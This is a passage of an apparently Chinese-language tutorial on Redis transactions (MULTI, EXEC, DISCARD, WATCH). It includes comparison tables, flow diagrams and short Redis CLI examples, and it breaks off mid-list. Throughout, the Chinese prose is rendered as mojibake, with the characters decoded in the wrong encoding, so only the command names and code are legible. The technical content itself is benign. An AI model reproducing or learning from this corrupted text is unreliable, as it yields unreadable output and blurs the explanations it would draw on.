<p>Redis è¯ç”Ÿäºå†…å­˜æ•°æ®åº“çš„é»„é‡‘æ—¶ä»£ï¼Œå®ƒçš„å®šä½æ˜¯â€œå¿«è€Œçµæ´»â€ã€‚å‡­å€Ÿæ¯«ç§’çº§çš„å“åº”é€Ÿåº¦å’Œä¸°å¯Œçš„æ•°æ®ç»“æ„ï¼ŒRedis åœ¨ç¼“å­˜ã€é˜Ÿåˆ—ã€è®¡æ•°å™¨ç­‰åœºæ™¯ä¸­å¤§æ”¾å¼‚å½©ã€‚ç„¶è€Œï¼Œå½“ä¸šåŠ¡é€»è¾‘æ¶‰åŠå¤šä¸ªæ“ä½œéœ€è¦â€œè¦ä¹ˆå…¨æˆåŠŸï¼Œè¦ä¹ˆå…¨å¤±è´¥â€æ—¶ï¼Œå•å‘½ä»¤çš„åŸå­æ€§å°±æ˜¾å¾—æ‰è¥Ÿè§è‚˜äº†ã€‚è¿™æ—¶å€™ï¼ŒRedis çš„äº‹åŠ¡æœºåˆ¶åº”è¿è€Œç”Ÿã€‚</p>
<p>ä¸ä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚ MySQLï¼‰çš„äº‹åŠ¡ç›¸æ¯”ï¼ŒRedis çš„äº‹åŠ¡æ›´åƒæ˜¯ä¸€ä¸ªâ€œè½»è£…ä¸Šé˜µâ€çš„åŠ©æ‰‹ã€‚å®ƒä¸æä¾›å®Œæ•´çš„ ACIDï¼ˆåŸå­æ€§ã€ä¸€è‡´æ€§ã€éš”ç¦»æ€§ã€æŒä¹…æ€§ï¼‰ä¿è¯ï¼Œè€Œæ˜¯é€šè¿‡å‘½ä»¤é˜Ÿåˆ—å’Œå»¶è¿Ÿæ‰§è¡Œï¼Œå®ç°äº†æœ‰é™çš„åŸå­æ€§æ”¯æŒã€‚è¿™ç§è®¾è®¡ç‰ºç‰²äº†éƒ¨åˆ†åŠŸèƒ½ï¼ˆå¦‚å›æ»šï¼‰ï¼Œæ¢æ¥äº†æ›´é«˜çš„æ€§èƒ½å’Œæ›´ä½çš„å¤æ‚åº¦ã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œåœ¨ä¸€ä¸ªç”µå•†ç³»ç»Ÿä¸­ï¼Œåº“å­˜æ‰£å‡å’Œè®¢å•ç”Ÿæˆå¿…é¡»åŒæ—¶å®Œæˆï¼ŒRedis çš„äº‹åŠ¡å°±èƒ½æ´¾ä¸Šç”¨åœºã€‚å®ƒé€‚ç”¨äºè½»é‡çº§åŸå­æ“ä½œï¼Œæ¯”å¦‚æ‰¹é‡æ›´æ–°ç¼“å­˜ã€ç§¯åˆ†ç´¯åŠ ã€åº“å­˜ç®¡ç†ç­‰åœºæ™¯ã€‚</p>
<h3 data-id="heading-3">2. ç›®æ ‡è¯»è€…ä¸æ–‡ç« ç»“æ„</h3>
<p>å¦‚æœä½ å·²ç»ä½¿ç”¨ Redis 1-2 å¹´ï¼Œç†Ÿæ‚‰åŸºæœ¬å‘½ä»¤ä½†å¯¹äº‹åŠ¡æœºåˆ¶è¿˜åœç•™åœ¨â€œå¬è¯´è¿‡â€çš„é˜¶æ®µï¼Œè¿™ç¯‡æ–‡ç« æ­£æ˜¯ä¸ºä½ é‡èº«æ‰“é€ çš„ã€‚æˆ‘ä»¬å¸Œæœ›é€šè¿‡ç”±æµ…å…¥æ·±çš„è®²è§£ï¼Œå¸®åŠ©ä½ ä¸ä»…ç†è§£ <code>MULTI</code>ã€<code>EXEC</code> å’Œ <code>WATCH</code> çš„åŸç†ï¼Œè¿˜èƒ½åœ¨é¡¹ç›®ä¸­è‡ªä¿¡åœ°åº”ç”¨å®ƒä»¬ã€‚</p>
<p>æ–‡ç« å°†ä»åŸºç¡€çŸ¥è¯†å¼€å§‹ï¼Œé€æ­¥æ·±å…¥åˆ°æ ¸å¿ƒå‘½ä»¤çš„å‰–æï¼Œå†åˆ°å®æˆ˜æ¡ˆä¾‹å’Œä¼˜åŒ–æŠ€å·§ã€‚å…·ä½“ç»“æ„å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>åŸºç¡€ç¯‡</strong>ï¼šå¸¦ä½ è®¤è¯† Redis äº‹åŠ¡çš„æœ¬è´¨å’ŒåŸºæœ¬ç”¨æ³•ã€‚</li>
<li><strong>å‰–æç¯‡</strong>ï¼šæ‹†è§£ <code>MULTI</code> å’Œ <code>EXEC</code> çš„å·¥ä½œåŸç†ï¼Œæ­ç¤ºå…¶ä¼˜åŠ¿ä¸å±€é™ã€‚</li>
<li><strong>å®æˆ˜ç¯‡</strong>ï¼šèšç„¦ <code>WATCH</code> çš„ä¹è§‚é”ç‰¹æ€§ï¼Œç»“åˆåº“å­˜æ‰£å‡ç­‰åœºæ™¯å®æˆ˜æ¼”ç»ƒã€‚</li>
<li><strong>é«˜çº§ç¯‡</strong>ï¼šæ¢è®¨äº‹åŠ¡ä¸ Lua è„šæœ¬çš„å¯¹æ¯”ï¼Œä»¥åŠåˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„ä¼˜åŒ–ã€‚</li>
<li><strong>ç»éªŒç¯‡</strong>ï¼šåˆ†äº«çœŸå®é¡¹ç›®ä¸­çš„è¸©å‘æ•™è®­å’Œæœ€ä½³å®è·µã€‚</li>
<li><strong>æ€»ç»“ç¯‡</strong>ï¼šæç‚¼æ ¸å¿ƒè¦ç‚¹å¹¶å±•æœ›æœªæ¥ã€‚</li>
</ul>
<p>ä»ç†è®ºåˆ°å®è·µï¼Œæˆ‘ä»¬å°†ç”¨ä»£ç å’Œç»éªŒä¸ºä½ é“ºå¹³å­¦ä¹ ä¹‹è·¯ã€‚æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬ä» Redis äº‹åŠ¡çš„åŸºç¡€å¼€å§‹ï¼Œé€æ­¥æ­å¼€å®ƒçš„ç¥ç§˜é¢çº±ã€‚</p>
<hr/>
<h2 data-id="heading-4">äºŒã€Redisäº‹åŠ¡æœºåˆ¶åŸºç¡€ï¼ˆçº¦600-800å­—ï¼‰</h2>
<p>Redis çš„äº‹åŠ¡æœºåˆ¶è™½ç„¶ä¸åƒä¼ ç»Ÿæ•°æ®åº“é‚£æ ·å¤æ‚ï¼Œä½†å®ƒå´æ˜¯ Redis åœ¨å¹¶å‘åœºæ™¯ä¸‹çš„ä¸€æŠŠâ€œåˆ©å™¨â€ã€‚æœ¬ç« å°†å¸¦ä½ ä»é›¶å¼€å§‹è®¤è¯† Redis äº‹åŠ¡çš„æ ¸å¿ƒæ¦‚å¿µå’ŒåŸºæœ¬ç”¨æ³•ï¼Œä¸ºåç»­çš„æ·±å…¥å‰–ææ‰“ä¸‹åšå®åŸºç¡€ã€‚æ— è®ºä½ æ˜¯æƒ³å¿«é€Ÿä¸Šæ‰‹ï¼Œè¿˜æ˜¯ä¸ºå®æˆ˜åšå‡†å¤‡ï¼Œè¿™é‡Œéƒ½ä¼šç»™ä½ ä¸€ä¸ªæ¸…æ™°çš„èµ·ç‚¹ã€‚</p>
<h3 data-id="heading-5">1. ä»€ä¹ˆæ˜¯Redisäº‹åŠ¡ï¼Ÿ</h3>
<p>Redis çš„äº‹åŠ¡æ˜¯ä¸€ä¸ªå‘½ä»¤åºåˆ—çš„é›†åˆï¼Œè¿™äº›å‘½ä»¤è¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆå…¨éƒ¨ä¸æ‰§è¡Œã€‚å¬èµ·æ¥æ˜¯ä¸æ˜¯å¾ˆåƒæ•°æ®åº“äº‹åŠ¡ï¼Ÿä½†åˆ«æ€¥ï¼ŒRedis çš„äº‹åŠ¡æ›´åƒæ˜¯â€œè½»é‡ç‰ˆâ€ã€‚å®ƒé€šè¿‡å°†å¤šä¸ªå‘½ä»¤æ”¾å…¥é˜Ÿåˆ—å¹¶ä¸€æ¬¡æ€§æ‰§è¡Œï¼Œä¿è¯äº†ä¸€å®šç¨‹åº¦çš„<strong>åŸå­æ€§</strong>ï¼Œä½†å¯¹<strong>éš”ç¦»æ€§</strong>å’Œ<strong>ä¸€è‡´æ€§</strong>çš„æ”¯æŒæœ‰é™ï¼Œæ›´åˆ«æå›æ»šäº†ã€‚</p>
<p>ä¸å…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚ MySQLï¼‰çš„äº‹åŠ¡ç›¸æ¯”ï¼ŒRedis äº‹åŠ¡æ›´åƒæ˜¯ä¸€ä¸ªâ€œè®¡åˆ’è¡¨â€ï¼šä½ å…ˆåˆ—å¥½è¦åšçš„äº‹ï¼ˆå‘½ä»¤ï¼‰ï¼Œç„¶åäº¤ç»™ Redis åœ¨æŸä¸ªæ—¶åˆ»ç»Ÿä¸€æ‰§è¡Œã€‚MySQL çš„äº‹åŠ¡å¯ä»¥å›æ»šï¼ŒRedis å´ä¸è¡Œï¼›MySQL æœ‰é”æœºåˆ¶ä¿è¯éš”ç¦»æ€§ï¼ŒRedis åˆ™æ›´ä¾èµ–å®¢æˆ·ç«¯çš„é…åˆã€‚è¿™ç§å·®å¼‚æºäº Redis çš„è®¾è®¡å“²å­¦ï¼šè¿½æ±‚æè‡´æ€§èƒ½ï¼Œç®€åŒ–å¤æ‚é€»è¾‘ã€‚</p>
<p><strong>è¡¨æ ¼1ï¼šRedisäº‹åŠ¡ vs ä¼ ç»Ÿæ•°æ®åº“äº‹åŠ¡å¯¹æ¯”</strong></p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>Redis äº‹åŠ¡</th><th>ä¼ ç»Ÿæ•°æ®åº“äº‹åŠ¡ (å¦‚ MySQL)</th></tr></thead><tbody><tr><td>åŸå­æ€§</td><td>æ”¯æŒï¼ˆæœ‰é™ï¼‰</td><td>å®Œå…¨æ”¯æŒ</td></tr><tr><td>éš”ç¦»æ€§</td><td>éƒ¨åˆ†æ”¯æŒï¼ˆä¾èµ– WATCHï¼‰</td><td>å®Œå…¨æ”¯æŒï¼ˆé”æœºåˆ¶ï¼‰</td></tr><tr><td>ä¸€è‡´æ€§</td><td>ä¾èµ–å®¢æˆ·ç«¯é€»è¾‘</td><td>å®Œå…¨æ”¯æŒ</td></tr><tr><td>å›æ»š</td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td>æ€§èƒ½å¼€é”€</td><td>ä½</td><td>è¾ƒé«˜</td></tr></tbody></table>
<h3 data-id="heading-6">2. æ ¸å¿ƒå‘½ä»¤ç®€ä»‹</h3>
<p>Redis çš„äº‹åŠ¡æœºåˆ¶ä¸»è¦å›´ç»•ä»¥ä¸‹å››ä¸ªå‘½ä»¤å±•å¼€ï¼š</p>
<ul>
<li><strong><code>MULTI</code></strong>ï¼šäº‹åŠ¡çš„â€œå¼€åœºç™½â€ï¼Œå‘Šè¯‰ Redis æ¥ä¸‹æ¥çš„å‘½ä»¤éœ€è¦å…¥é˜Ÿï¼Œè€Œä¸æ˜¯ç«‹å³æ‰§è¡Œã€‚</li>
<li><strong><code>EXEC</code></strong>ï¼šäº‹åŠ¡çš„â€œå‹è½´æˆâ€ï¼Œè§¦å‘é˜Ÿåˆ—ä¸­æ‰€æœ‰å‘½ä»¤æŒ‰é¡ºåºæ‰§è¡Œã€‚</li>
<li><strong><code>DISCARD</code></strong>ï¼šäº‹åŠ¡çš„â€œæ’¤é€€é”®â€ï¼Œæ”¾å¼ƒå½“å‰é˜Ÿåˆ—ï¼Œæ¸…ç©ºæœªæ‰§è¡Œçš„è®¡åˆ’ã€‚</li>
<li><strong><code>WATCH</code></strong>ï¼šäº‹åŠ¡çš„â€œå“¨å…µâ€ï¼Œç›‘æ§æŒ‡å®šé”®çš„å˜åŠ¨ï¼Œç”¨äºå®ç°ä¹è§‚é”ã€‚</li>
</ul>
<p>è¿™äº›å‘½ä»¤å°±åƒä¸€ä¸ªå‰§æœ¬çš„å¯¼æ¼”ã€æ¼”å‘˜å’Œé“å…·å¸ˆï¼Œé…åˆèµ·æ¥å®Œæˆä¸€åœºæ¼”å‡ºã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡å·¥ä½œæµç¨‹çœ‹çœ‹å®ƒä»¬å¦‚ä½•â€œä¸Šå°â€ã€‚</p>
<h3 data-id="heading-7">3. äº‹åŠ¡çš„åŸºæœ¬å·¥ä½œæµç¨‹</h3>
<p>Redis äº‹åŠ¡çš„æ‰§è¡Œå¯ä»¥åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š<strong>å‘½ä»¤å…¥é˜Ÿ</strong>å’Œ<strong>æ‰§è¡Œé˜¶æ®µ</strong>ã€‚ç”¨ä¸€ä¸ªç”Ÿæ´»åŒ–çš„æ¯”å–»æ¥è¯´ï¼Œå°±åƒä½ åœ¨é¤å…ç‚¹é¤ï¼šå…ˆæŠŠèœåæŠ¥ç»™æœåŠ¡å‘˜ï¼ˆå…¥é˜Ÿï¼‰ï¼Œç„¶åç­‰æœåŠ¡å‘˜ç¡®è®¤åä¸€èµ·ä¸Šèœï¼ˆæ‰§è¡Œï¼‰ã€‚</p>
<ul>
<li><strong>å‘½ä»¤å…¥é˜Ÿ</strong>ï¼šè°ƒç”¨ <code>MULTI</code> åï¼Œåç»­å‘½ä»¤ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œè€Œæ˜¯è¢«æ”¾å…¥ä¸€ä¸ªé˜Ÿåˆ—ã€‚Redis ä¼šè¿”å› <code>QUEUED</code> è¡¨ç¤ºå‘½ä»¤å·²å…¥é˜Ÿã€‚</li>
<li><strong>æ‰§è¡Œé˜¶æ®µ</strong>ï¼šè°ƒç”¨ <code>EXEC</code> åï¼Œé˜Ÿåˆ—ä¸­çš„å‘½ä»¤æŒ‰é¡ºåºæ‰§è¡Œã€‚å¦‚æœä¸­é€”æœ‰è¯­æ³•é”™è¯¯çš„å‘½ä»¤ï¼Œæ•´ä¸ªäº‹åŠ¡ä¼šå¤±è´¥ï¼›å¦‚æœæ˜¯è¿è¡Œæ—¶é”™è¯¯ï¼ˆå¦‚æ“ä½œç±»å‹ä¸åŒ¹é…ï¼‰ï¼Œåˆ™åªå½±å“è¯¥å‘½ä»¤ï¼Œå…¶ä»–å‘½ä»¤ç…§å¸¸æ‰§è¡Œã€‚</li>
</ul>
<p><strong>ç¤ºæ„å›¾1ï¼šRedisäº‹åŠ¡åŸºæœ¬æµç¨‹</strong></p>
<pre><code class="hljs language-sql" lang="sql">[å®¢æˆ·ç«¯]          [RedisæœåŠ¡å™¨]
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
MULTI <span class="hljs-comment">-------------&gt; | å¼€å¯äº‹åŠ¡</span>
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
å‘½ä»¤<span class="hljs-number">1</span> <span class="hljs-comment">-------------&gt; | QUEUED</span>
å‘½ä»¤<span class="hljs-number">2</span> <span class="hljs-comment">-------------&gt; | QUEUED</span>
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
<span class="hljs-keyword">EXEC</span> <span class="hljs-comment">--------------&gt; | æ‰§è¡Œé˜Ÿåˆ—ä¸­çš„å‘½ä»¤</span>
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
<span class="hljs-operator">&lt;</span><span class="hljs-comment">------------------- | è¿”å›ç»“æœ</span>
</code></pre>
<h3 data-id="heading-8">4. ä»£ç ç¤ºä¾‹</h3>
<p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¾‹å­æ„Ÿå—ä¸€ä¸‹äº‹åŠ¡çš„é­…åŠ›ã€‚å‡è®¾æˆ‘ä»¬è¦æ›´æ–°ç”¨æˆ·çš„ç§¯åˆ†å’Œæœ€åæ›´æ–°æ—¶é—´ï¼Œç¡®ä¿ä¸¤è€…åŒæ—¶å®Œæˆï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¼€å¯äº‹åŠ¡</span>
MULTI
<span class="hljs-comment"># å¢åŠ ç”¨æˆ·1001çš„ç§¯åˆ†</span>
INCR user:points:1001
<span class="hljs-comment"># è®¾ç½®ç”¨æˆ·1001çš„æœ€åæ›´æ–°æ—¶é—´</span>
SET user:last_update:1001 <span class="hljs-string">"2025-04-07"</span>
<span class="hljs-comment"># æ‰§è¡Œäº‹åŠ¡</span>
EXEC
</code></pre>
<p><strong>ä»£ç æ³¨é‡Š</strong>ï¼š</p>
<ul>
<li><code>MULTI</code>ï¼šæ ‡å¿—äº‹åŠ¡å¼€å§‹ï¼Œåç»­å‘½ä»¤è¢«æ”¾å…¥é˜Ÿåˆ—ã€‚</li>
<li><code>INCR</code>ï¼šå°†ç§¯åˆ†åŠ  1ï¼Œè¿”å›æ–°çš„ç§¯åˆ†å€¼ã€‚</li>
<li><code>SET</code>ï¼šè®¾ç½®æ—¶é—´æˆ³ï¼Œä¿è¯ä¸ç§¯åˆ†æ›´æ–°åŒæ­¥ã€‚</li>
<li><code>EXEC</code>ï¼šè§¦å‘é˜Ÿåˆ—æ‰§è¡Œï¼Œè¿”å› <code>[2, "OK"]</code>ï¼Œè¡¨ç¤ºä¸¤ä¸ªå‘½ä»¤çš„ç»“æœã€‚</li>
</ul>
<p>å¦‚æœæ‰§è¡ŒæˆåŠŸï¼Œç§¯åˆ†å’Œæ—¶é—´æˆ³ä¼šåŒæ—¶æ›´æ–°ï¼›å¦‚æœç½‘ç»œä¸­æ–­æˆ–è¯­æ³•é”™è¯¯ï¼Œäº‹åŠ¡ä¼šæ•´ä½“å¤±è´¥ã€‚è¿™ç§â€œå…¨æœ‰æˆ–å…¨æ— â€çš„ç‰¹æ€§ï¼Œæ­£æ˜¯ Redis äº‹åŠ¡çš„æ ¸å¿ƒä»·å€¼ã€‚</p>
<p>é€šè¿‡æœ¬ç« ï¼Œä½ å·²ç»æŒæ¡äº† Redis äº‹åŠ¡çš„åŸºæœ¬æ¦‚å¿µå’Œç”¨æ³•ã€‚ä½†è¿™åªæ˜¯â€œçƒ­èº«â€ï¼Œ<code>MULTI</code> å’Œ <code>EXEC</code> èƒŒåè¿˜æœ‰æ›´å¤šç»†èŠ‚å€¼å¾—æ¢ç´¢ã€‚æ¯”å¦‚ï¼Œå‘½ä»¤é˜Ÿåˆ—æ˜¯å¦‚ä½•ç®¡ç†çš„ï¼Ÿäº‹åŠ¡å¤±è´¥æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ·±å…¥å‰–æ <code>MULTI</code> å’Œ <code>EXEC</code> çš„å·¥ä½œåŸç†ï¼Œå¸¦ä½ çœ‹çœ‹è¿™å¯¹â€œé»„é‡‘æ­æ¡£â€çš„çœŸé¢ç›®ã€‚</p>
<hr/>
<h2 data-id="heading-9">ä¸‰ã€MULTIä¸EXECçš„æ·±åº¦å‰–æï¼ˆçº¦800-1000å­—ï¼‰</h2>
<p>åœ¨ Redis äº‹åŠ¡çš„èˆå°ä¸Šï¼Œ<code>MULTI</code> å’Œ <code>EXEC</code> æ˜¯ç»å¯¹çš„ä¸»è§’ã€‚å¦‚æœè¯´ä¸Šä¸€ç« æ˜¯è®©ä½ â€œåˆè¯†â€å®ƒä»¬ï¼Œè¿™ä¸€ç« åˆ™æ˜¯å¸¦ä½ â€œæ·±å…¥â€å®ƒä»¬çš„å†…æ ¸ï¼Œæ‹†è§£å·¥ä½œåŸç†ã€åˆ†æä¼˜åŠ£ï¼Œå¹¶é€šè¿‡å®æˆ˜åœºæ™¯è®©ä½ æ„Ÿå—åˆ°å®ƒä»¬çš„çœŸæ­£å¨åŠ›ã€‚å‡†å¤‡å¥½äº†å—ï¼Ÿè®©æˆ‘ä»¬ä¸€æ¢ç©¶ç«Ÿï¼</p>
<h3 data-id="heading-10">1. MULTIçš„å·¥ä½œåŸç†</h3>
<p><code>MULTI</code> æ˜¯äº‹åŠ¡çš„èµ·ç‚¹ï¼Œå®ƒçš„æœ¬è´¨æ˜¯ä¸ºå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªå‘½ä»¤é˜Ÿåˆ—ã€‚æ‰“ä¸ªæ¯”å–»ï¼Œå®ƒå°±åƒä¸€ä¸ªâ€œè´­ç‰©ç¯®â€ï¼Œä½ æŠŠæƒ³ä¹°çš„ä¸œè¥¿ï¼ˆå‘½ä»¤ï¼‰ä¸€ä»¶ä»¶æ”¾è¿›å»ï¼Œç­‰åˆ°ç»“è´¦ï¼ˆ<code>EXEC</code>ï¼‰æ—¶å†ç»Ÿä¸€å¤„ç†ã€‚åœ¨ Redis çš„å®ç°ä¸­ï¼Œè¿™ä¸ªé˜Ÿåˆ—å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„å†…å­˜ä¸Šä¸‹æ–‡ä¸­ï¼ŒæœåŠ¡ç«¯ä¼šä¸ºæ¯ä¸ªå¼€å¯äº‹åŠ¡çš„å®¢æˆ·ç«¯ç»´æŠ¤ä¸€ä¸ªç‹¬ç«‹çŠ¶æ€ã€‚</p>
<h4 data-id="heading-11">å‘½ä»¤é˜Ÿåˆ—çš„å†…å­˜ç®¡ç†</h4>
<p>æ¯è°ƒç”¨ä¸€æ¬¡ <code>MULTI</code>ï¼ŒRedis ä¼šä¸ºå½“å‰è¿æ¥åˆ†é…ä¸€ä¸ªäº‹åŠ¡çŠ¶æ€ç»“æ„ä½“ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªå‘½ä»¤åˆ—è¡¨ã€‚å½“ä½ è¾“å…¥åç»­å‘½ä»¤æ—¶ï¼ŒRedis ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œè€Œæ˜¯å°†å…¶å°è£…æˆä¸€ä¸ªå‘½ä»¤å¯¹è±¡ï¼Œæ ‡è®°ä¸º <code>QUEUED</code> å¹¶åŠ å…¥é˜Ÿåˆ—ã€‚è¿™ç§å»¶è¿Ÿæ‰§è¡Œçš„è®¾è®¡ï¼Œæ—¢ä¿è¯äº†å‘½ä»¤çš„é¡ºåºæ€§ï¼Œä¹Ÿé™ä½äº†é¢‘ç¹äº¤äº’çš„å¼€é”€ã€‚</p>
<h4 data-id="heading-12">äº‹åŠ¡ä¸­çš„é”™è¯¯å¤„ç†</h4>
<p>ä¸è¿‡ï¼Œé˜Ÿåˆ—å¹¶éä¸‡èƒ½ã€‚Redis å¯¹é”™è¯¯çš„å¤„ç†åˆ†ä¸ºä¸¤ç±»ï¼š</p>
<ul>
<li><strong>è¯­æ³•é”™è¯¯</strong>ï¼šæ¯”å¦‚è¾“å…¥äº†ä¸å­˜åœ¨çš„å‘½ä»¤ <code>SETX</code>ï¼Œåœ¨å…¥é˜Ÿåˆ—æ—¶å°±ä¼šè¢«æ£€æµ‹åˆ°ã€‚è°ƒç”¨ <code>EXEC</code> æ—¶ï¼Œæ•´ä¸ªäº‹åŠ¡ä¼šè¢«ç›´æ¥å–æ¶ˆã€‚</li>
<li><strong>æ‰§è¡Œæ—¶é”™è¯¯</strong>ï¼šæ¯”å¦‚å¯¹å­—ç¬¦ä¸²é”®æ‰§è¡Œ <code>LPUSH</code>ï¼Œè¿™ç§é”™è¯¯åªæœ‰åœ¨ <code>EXEC</code> æ‰§è¡Œæ—¶æ‰ä¼šæš´éœ²ï¼Œä½†ä¸ä¼šå½±å“å…¶ä»–å‘½ä»¤çš„æ‰§è¡Œã€‚</li>
</ul>
<p><strong>è¡¨æ ¼2ï¼šé”™è¯¯ç±»å‹å¯¹æ¯”</strong></p>




















<table><thead><tr><th>é”™è¯¯ç±»å‹</th><th>æ£€æµ‹æ—¶æœº</th><th>å¯¹äº‹åŠ¡çš„å½±å“</th></tr></thead><tbody><tr><td>è¯­æ³•é”™è¯¯</td><td>å…¥é˜Ÿæ—¶</td><td>æ•´ä¸ªäº‹åŠ¡å¤±è´¥</td></tr><tr><td>æ‰§è¡Œæ—¶é”™è¯¯</td><td>æ‰§è¡Œæ—¶ (<code>EXEC</code>)</td><td>ä»…å½±å“å‡ºé”™å‘½ä»¤ï¼Œå…¶ä»–ç»§ç»­</td></tr></tbody></table>
<h3 data-id="heading-13">2. EXECçš„æ‰§è¡Œé€»è¾‘</h3>
<p><code>EXEC</code> æ˜¯äº‹åŠ¡çš„â€œæ‰§è¡Œå®˜â€ï¼Œè´Ÿè´£å°†é˜Ÿåˆ—ä¸­çš„å‘½ä»¤é€ä¸€å˜ä¸ºç°å®ã€‚å®ƒçš„æ ¸å¿ƒåœ¨äº<strong>åŸå­æ€§</strong>ï¼šä¸€æ—¦å¼€å§‹æ‰§è¡Œï¼Œé˜Ÿåˆ—ä¸­çš„å‘½ä»¤ä¼šè¿ç»­å®Œæˆï¼Œä¸ä¼šè¢«å…¶ä»–å®¢æˆ·ç«¯çš„è¯·æ±‚æ‰“æ–­ã€‚è¿™ç§ç‰¹æ€§å¾—ç›Šäº Redis çš„å•çº¿ç¨‹äº‹ä»¶å¾ªç¯æ¨¡å‹ã€‚</p>
<h4 data-id="heading-14">åŸå­æ€§ä¿è¯çš„è¾¹ç•Œ</h4>
<p>ä½†åŸå­æ€§ä¹Ÿæœ‰è¾¹ç•Œã€‚å¦‚æœäº‹åŠ¡ä¸­åŒ…å«è¯­æ³•é”™è¯¯çš„å‘½ä»¤ï¼Œ<code>EXEC</code> ä¼šè¿”å›ç©ºç»“æœï¼ˆ<code>nil</code>ï¼‰ï¼Œé˜Ÿåˆ—ç›´æ¥ä½œåºŸã€‚æ­¤å¤–ï¼Œå¦‚æœ Redis æœåŠ¡ç«¯åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å´©æºƒï¼Œäº‹åŠ¡çš„åŸå­æ€§å°±æ— æ³•ä¿è¯äº†ã€‚å› æ­¤ï¼Œäº‹åŠ¡çš„å¯é æ€§å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–ç¨³å®šçš„ç½‘ç»œå’ŒæœåŠ¡å™¨ç¯å¢ƒã€‚</p>
<h4 data-id="heading-15">æ€§èƒ½å½±å“</h4>
<p>äº‹åŠ¡çš„é•¿åº¦ç›´æ¥å½±å“æ€§èƒ½ã€‚é˜Ÿåˆ—è¶Šé•¿ï¼Œæ‰§è¡Œæ—¶é—´è¶Šä¹…ï¼Œå°¤å…¶æ˜¯åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå¯èƒ½ä¼šé˜»å¡å…¶ä»–è¯·æ±‚ã€‚ç»éªŒæ³•åˆ™æ˜¯ï¼šå°½é‡ä¿æŒäº‹åŠ¡â€œçŸ­å°ç²¾æ‚â€ï¼Œé¿å…æŠŠå¤æ‚é€»è¾‘å¡è¿›å»ã€‚</p>
<h3 data-id="heading-16">3. ä¼˜åŠ¿ä¸å±€é™æ€§</h3>
<h4 data-id="heading-17">ä¼˜åŠ¿</h4>
<ul>
<li><strong>ç®€å•é«˜æ•ˆ</strong>ï¼šç›¸æ¯”ä¼ ç»Ÿæ•°æ®åº“äº‹åŠ¡ï¼ŒRedis äº‹åŠ¡æ— éœ€é”æœºåˆ¶ï¼Œå¼€é”€æä½ã€‚</li>
<li><strong>è½»é‡åŸå­æ€§</strong>ï¼šé€‚åˆéœ€è¦æ‰¹é‡æ“ä½œçš„åœºæ™¯ï¼Œå¦‚ç¼“å­˜æ›´æ–°ã€è®¡æ•°å™¨ç´¯åŠ ã€‚</li>
</ul>
<h4 data-id="heading-18">å±€é™æ€§</h4>
<ul>
<li><strong>ä¸æ”¯æŒå›æ»š</strong>ï¼šä¸€æ—¦å‘½ä»¤å…¥é˜Ÿï¼Œæ— æ³•ä¸­é€”æ’¤é”€ï¼Œå¤±è´¥äº†åªèƒ½ä»å¤´å†æ¥ã€‚</li>
<li><strong>é”™è¯¯å¤„ç†å¤æ‚</strong>ï¼šå®¢æˆ·ç«¯éœ€è¦æå‰é¢„åˆ¤å¯èƒ½çš„é—®é¢˜ï¼Œæ¯”å¦‚ç±»å‹ mismatchã€‚</li>
</ul>
<p><strong>ç¤ºæ„å›¾2ï¼šMULTI/EXEC æ‰§è¡Œè¿‡ç¨‹</strong></p>
<pre><code class="hljs language-sql" lang="sql">[å®¢æˆ·ç«¯]          [RedisæœåŠ¡å™¨]
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
MULTI <span class="hljs-comment">-------------&gt; | åˆ›å»ºé˜Ÿåˆ—</span>
<span class="hljs-keyword">SET</span> key1 val <span class="hljs-comment">------&gt; | QUEUED</span>
INCR key2 <span class="hljs-comment">---------&gt; | QUEUED</span>
<span class="hljs-keyword">EXEC</span> <span class="hljs-comment">--------------&gt; | æŒ‰åºæ‰§è¡Œï¼Œè¿”å› [OK, 2]</span>
</code></pre>
<h3 data-id="heading-19">4. å®æˆ˜åœºæ™¯</h3>
<h4 data-id="heading-20">åœºæ™¯1ï¼šæ‰¹é‡æ›´æ–°ç¼“å­˜æ•°æ®</h4>
<p>å‡è®¾æˆ‘ä»¬éœ€è¦åŒæ—¶æ›´æ–°ç”¨æˆ·çš„å§“åå’Œå¹´é¾„åˆ°ç¼“å­˜ä¸­ï¼Œç¡®ä¿ä¸¤è€…ä¸€è‡´ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¼€å¯äº‹åŠ¡</span>
MULTI
<span class="hljs-comment"># è®¾ç½®ç”¨æˆ·1001çš„å§“å</span>
SET cache:user:1001:name <span class="hljs-string">"Alice"</span>
<span class="hljs-comment"># è®¾ç½®ç”¨æˆ·1001çš„å¹´é¾„</span>
SET cache:user:1001:age <span class="hljs-string">"25"</span>
<span class="hljs-comment"># æ‰§è¡Œäº‹åŠ¡</span>
EXEC
</code></pre>
<p><strong>ä»£ç æ³¨é‡Š</strong>ï¼š</p>
<ul>
